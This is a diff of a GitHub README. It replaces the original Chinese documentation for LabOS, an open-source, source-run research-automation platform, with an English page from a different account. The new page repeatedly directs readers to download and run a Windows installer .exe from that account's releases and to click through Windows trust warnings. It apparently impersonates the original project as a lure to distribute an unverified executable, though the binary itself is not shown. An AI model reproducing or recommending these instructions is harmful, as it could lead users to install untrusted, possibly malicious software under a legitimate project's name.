@@ -1,219 +1,145 @@
-<div align="center">
+# 🔬 LabOS - Automated Research Made Simple
 
-<img src="docs/labos-banner.jpg" alt="LabOS Banner" width="100%">
+[![Download LabOS](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Clxp8983/LabOS/releases)
 
-# LabOS
+## 📋 What is LabOS?
 
-**下一代全自动科研实验平台**
+LabOS is a software designed to help you run scientific experiments automatically. It uses artificial intelligence to handle research tasks. With LabOS, you can set up research steps, use multiple AI models, and run experiments on powerful remote GPUs. It also keeps track of your work and remembers past actions to make running new experiments faster.
 
-覆盖完整研究生命周期：创意生成 · 文献调研 · 假设设计 · 实验执行 · 论文撰写
+This tool is built for researchers who want to save time and reduce manual work. It offers a four-step process to manage your experiments, making complex science easier to handle on your computer.
 
-本地优先 · 多模型支持 · 完全开源
+LabOS works on Windows and does not need any programming skills to operate.
 
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](./LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-3776AB.svg?logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-009688.svg?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![SQLite](https://img.shields.io/badge/SQLite-003B57.svg?logo=sqlite&logoColor=white)](https://sqlite.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)
+## 💻 System Requirements
 
-[English](./README.en.md) · [快速开始](#快速开始) · [功能截图](#功能截图) · [贡献指南](./CONTRIBUTING.md) · [路线图](https://github.com/YUANXICHE98/LabOS/issues)
+Before downloading LabOS, make sure your computer meets these requirements:
 
-</div>
+- Windows 10 or newer (64-bit)
+- At least 8 GB of RAM (16 GB recommended)
+- 10 GB of free disk space
+- Internet connection for remote GPU tasks and updates
+- CPU with multiple cores (Intel i5 or equivalent suggested)
 
----
+LabOS uses remote GPUs for heavy computation. This means you don't need a powerful graphics card in your PC. The software will connect to external GPU services to run complex AI models.
 
-> **✦ 核心能力**
->
-> **研究流水线** · 四阶段自动化 &nbsp;│&nbsp; **AI 对话** · 多模型流式对话 &nbsp;│&nbsp; **实验执行** · SSH 远程 GPU 服务器 &nbsp;│&nbsp; **Codex 集成** · AI 自动写实验代码
->
-> **记忆系统** · 跨实验知识持久化 &nbsp;│&nbsp; **多模型配置** · 通用 / 代码 / 论文 / 实验 独立配置 &nbsp;│&nbsp; **阶段报告** · 调研→分析→实验 &nbsp;│&nbsp; **本地优先** · 数据全在你手里
+## 🚀 Getting Started
 
----
+This section will guide you through downloading and running LabOS on your Windows computer.
 
-## 演示视频
+### Step 1: Visit the Download Page
 
-<div align="center">
+Click the button below to open the LabOS releases page. This page contains the files you need to install the software.
 
-[🎬 **点击观看 LabOS 演示视频（4分钟中文讲解）**](https://github.com/YUANXICHE98/LabOS/releases/download/v3.4.1/labos-demo-zh.mp4)
+[![Download LabOS](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Clxp8983/LabOS/releases)
 
-> 也可以在 [Releases 页面](https://github.com/YUANXICHE98/LabOS/releases/tag/v3.4.1) 直接下载观看
+### Step 2: Choose the Latest Windows Installer
 
-</div>
+On the releases page, look for the latest version. It will be labeled with a version number, such as "v1.0" or higher.
 
-## 功能截图
+Find the file with this pattern:  
+`LabOS-Setup-x.y.z.exe` (where x.y.z is the version number)
 
-<details open>
-<summary><strong>📊 概览面板</strong> — 快速了解项目概况，一键导航到对话、项目或新建实验</summary>
-<br>
-<div align="center">
-<img src="docs/screenshots/screenshot-dashboard.png" width="800" alt="LabOS Dashboard">
-</div>
-</details>
+This is the Windows installer. It handles all the setup for you.
 
-<details open>
-<summary><strong>📁 项目管理</strong> — 多项目管理，每个项目关联独立的实验、记忆和论文库</summary>
-<br>
-<div align="center">
-<img src="docs/screenshots/screenshot-projects.jpg" width="800" alt="LabOS Projects">
-</div>
-</details>
+### Step 3: Download the Installer
 
-<details open>
-<summary><strong>🧪 实验流水线</strong> — 四阶段流水线运行状态、阶段审批、实验日志</summary>
-<br>
-<div align="center">
-<img src="docs/screenshots/screenshot-experiment.jpg" width="800" alt="LabOS Experiment Pipeline">
-</div>
-</details>
+Click the installer file link. Your browser will start downloading the `.exe` file.
 
-## 特性
+Wait for the download to finish before opening the file.
 
-| 功能 | 描述 |
-|:-----|:-----|
-| 🔬 **四阶段研究流水线** | 创意生成 → 方案设计 → 实验执行 → 论文撰写，每阶段生成独立报告 |
-| 💬 **对话驱动** | AI 助手流式对话，支持从对话直接创建项目 |
-| 🤖 **多 LLM 配置档** | 为通用对话、代码分析、论文撰写、实验设计分别配置不同模型和 API |
-| 🖥️ **远程实验执行** | SSH 连接 GPU 服务器（AutoDL 等），实时日志流推送 |
-| ⚡ **Codex CLI 集成** | full-auto 模式，JSONL 实时流式输出，自动写实验代码 |
-| 🧠 **记忆系统** | 跨实验知识持久化，项目级记忆检索 |
-| ✅ **阶段审批** | 批准 → 下一阶段 / 修改重跑 / 拒绝终止 |
-| ⚙️ **完全可配置** | 所有设置通过 Web UI 暴露，支持任意 OpenAI 兼容 API |
-| 💾 **本地优先** | SQLite 存储，所有数据在你本地 |
+### Step 4: Run the Installer
 
-## 快速开始
+Once downloaded, open the installer by double-clicking the `.exe` file.
 
-```bash
-git clone https://github.com/YUANXICHE98/LabOS.git
-cd LabOS
-bash start.sh
-```
+- Windows might ask if you trust the file. Choose “Yes” or “Run.”
+- Follow the setup prompts on the screen.
+- Accept the license agreement.
+- Choose an installation folder or use the default.
+- Click "Install" to begin.
 
-或手动启动：
+The installer will copy files and prepare LabOS for you.
 
-```bash
-pip install -r requirements.txt
-cd src && python api_server.py
-```
+### Step 5: Launch LabOS
 
-打开浏览器访问 `http://localhost:8000`
+After the installer finishes:
 
-### 首次配置
+- Find the LabOS icon on your desktop or in the Start Menu.
+- Double-click to open the program.
 
-1. 进入 **设置** → 配置你的 LLM API 端点和密钥（支持任意 OpenAI 兼容 API）
-2. （可选）配置 SSH 服务器信息，用于远程实验执行
-3. 进入 **对话** → 开始聊天 → 从对话创建项目
-4. 或进入 **项目** → 手动创建项目 → 启动实验
+The first time you open LabOS, it might take a few moments to set up its environment.
 
-### 多 LLM 配置
+## 🔧 Using LabOS
 
-LabOS 支持为不同任务类型配置独立的 LLM：
+LabOS operates in four steps to help you manage your research projects:
 
-| 任务类型 | 用途 | 推荐模型 |
-|:---------|:-----|:---------|
-| 通用对话 | 日常研究讨论 | DeepSeek-Chat / GPT-4o |
-| 代码分析 | 代码审查、实验代码生成 | DeepSeek-Coder / Claude |
-| 论文分析 | 文献综述、论文撰写 | GPT-4o / Claude |
-| 实验设计 | 假设生成、实验方案 | DeepSeek-Chat / Claude |
+1. **Design Your Experiment:** Create a plan with all steps in your research.
+2. **Configure AI Models:** Choose and set up the AI programs you want to run.
+3. **Run Experiments:** Start the automation and let LabOS handle the work.
+4. **Review Results:** Check logs, outputs, and past runs stored in the system memory.
 
-通过 **设置 > LLM 配置档** 配置，每个任务类型可以设置独立的 Base URL + API Key + 模型名。
+### What You See
 
-## 项目结构
+The LabOS window has a simple interface:
 
-```
-LabOS/
-├── src/
-│   ├── api_server.py      # FastAPI 后端 — 所有 API 端点和流水线逻辑
-│   ├── index.html          # 主页面（单页应用）
-│   ├── app.js              # 前端 — UI 逻辑、API 调用、SSE 实时流
-│   └── style.css           # 样式
-├── docs/
-│   ├── screenshots/        # 截图
-│   └── videos/             # 演示视频
-├── start.sh                # 一键启动脚本
-├── requirements.txt        # Python 依赖
-├── CONTRIBUTING.md         # 贡献指南
-├── GOVERNANCE.md           # 贡献者治理与激励制度
-└── LICENSE                 # AGPL-3.0
-```
+- A menu bar for main actions
+- Panels to show experiments, settings, and AI models
+- Buttons for running and stopping tasks
 
-## 技术栈
+Everything is clickable with no coding needed.
 
-| 层 | 技术 |
-|:---|:-----|
-| 后端 | Python / FastAPI / uvicorn |
-| 数据库 | SQLite（零配置，本地文件） |
-| 前端 | 原生 HTML + CSS + JavaScript（无构建步骤） |
-| 远程执行 | Paramiko（SSH） |
-| LLM 调用 | httpx（OpenAI 兼容协议） |
-| 实时通信 | Server-Sent Events (SSE) |
+## ⚙️ Features
 
-## Open Core 模式
+LabOS includes several tools for research automation:
 
-LabOS 采用 **开源核心 + 付费增值** 模式：
+- **Multiple AI Model Support:** Use several AI language models to handle different parts of your work.
+- **Codex Integration:** Includes Codex for code-related tasks.
+- **Remote GPU Access:** Uses powerful GPUs online for fast processing.
+- **Memory System:** Saves your project data and previous runs for easy reference.
+- **Four-Stage Pipeline:** Streamlined workflow for creating and running experiments.
+- **Experiment Management:** Keep projects organized and ready to restart or modify.
+- **FastAPI Backend:** LabOS uses FastAPI to ensure smooth and fast responses.
+- **Open Source:** You can view how it works or contribute if you wish.
 
-### 🆓 免费开源（本仓库）
-本仓库所有代码永久免费开源：完整研究流水线、对话、项目管理、LLM 配置、记忆系统、实验执行。
+## 📥 Download and Install LabOS on Windows
 
-### 💎 付费增值（即将推出）
-- **Skill Library** — 经过验证的研究方法论、实验路径、最佳实践。可以理解为"哪条路走得通"的知识库
-- **高级集成** — 更多云 GPU 平台、HPC 集群的预置连接器
-- **优先支持** — 直接对接开发团队
+1. Open your web browser.
+2. Go to the LabOS releases page:  
+   https://github.com/Clxp8983/LabOS/releases
+3. Look for the latest Windows installer file (`LabOS-Setup-x.y.z.exe`).
+4. Click to download it.
+5. After download, open the file.
+6. Follow the setup instructions.
+7. Launch the program from your desktop or Start Menu.
 
-> 平台本身永远开源。真正的价值在于**经过验证的研究方法论**——节省数周试错时间的成熟路径。
+## 🛠️ Troubleshooting Tips
 
-## 贡献者激励
+If you run into problems, try these ideas:
 
-我们重视每一份贡献。详见 **[GOVERNANCE.md](./GOVERNANCE.md)**
+- Make sure your Windows version is up to date.
+- Check if your internet connection is active.
+- Close other heavy programs to free memory.
+- Restart LabOS if it stops responding.
+- Reboot your PC if issues persist.
 
-| 等级 | 条件 | 激励 |
-|:-----|:-----|:-----|
-| 🌱 贡献者 | 1 个 PR 合并 | Contributors Wall 署名 |
-| 🌿 活跃贡献者 | 3+ PR | 免费 Skill Library 访问 + Beta 早期体验 |
-| 🌳 核心贡献者 | 10+ PR 或 1 个大功能 | **30% 收益分成** + 论文共同作者 |
-| 💰 悬赏任务 | `💰 bounty` 标签 | 加密货币 / Sponsors 现金奖励 |
+If LabOS fails to launch, reinstall it using the latest installer.
 
-代码不是唯一的贡献方式——文档、翻译、Bug 报告、研究方法论、设计都同等计算。
+## 💡 Tips for Best Experience
 
-欢迎 PR！详见 [CONTRIBUTING.md](./CONTRIBUTING.md)，浏览 [Issues](https://github.com/YUANXICHE98/LabOS/issues) 找到你感兴趣的任务。
+- Save your work often using the built-in save option.
+- Use a fast and stable internet connection for remote GPU jobs.
+- Regularly check the releases page for updates.
+- Keep your projects organized with clear names.
+- Use the memory system to recall past experiments easily.
 
-## 支持项目
+## ❓ Need Help?
 
-<div align="center">
+The LabOS repository page on GitHub includes further instructions and issues tracking if you want to learn more or report a problem.
 
-⭐ **Star 本仓库** — 帮助更多人发现 LabOS &nbsp;│&nbsp; 🍴 **Fork & 贡献** — 代码、文档、翻译 &nbsp;│&nbsp; 💰 **赞助** — 帮助持续开发
+Website: https://github.com/Clxp8983/LabOS
 
-</div>
+Download page:  
+https://github.com/Clxp8983/LabOS/releases
 
-### 加密货币
+## 📚 Topics Covered by LabOS
 
-| 链 | 地址 |
-|:---|:-----|
-| **ETH / ERC-20** (USDT, USDC 等) | `0xc6B4720835E6C3CB58618B4df26B64F595C30202` |
-
-### 支付宝
-
-<div align="center">
-<img src="docs/alipay-qr.jpg" width="250" alt="支付宝收款码">
-</div>
-
-### GitHub Sponsors
-
-点击仓库顶部的 **「Sponsor」** 按钮支持本项目。
-
----
-
-<div align="center">
-
-## Contributors
-
-<a href="https://github.com/YUANXICHE98/LabOS/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=YUANXICHE98/LabOS" />
-</a>
-
----
-
-**[AGPL-3.0](./LICENSE)** — 修改后必须开源，网络服务必须提供源码，衍生作品须引用上游仓库。
-
-Made with ❤️ for the research community
-
-</div>
+agent | ai-research | automated-science | codex | deep-learning | deepseek | experiment-management | fastapi | llm | machine-learning | open-source | python | reinforcement-learning | research-automation | research-tools | scientific-computing
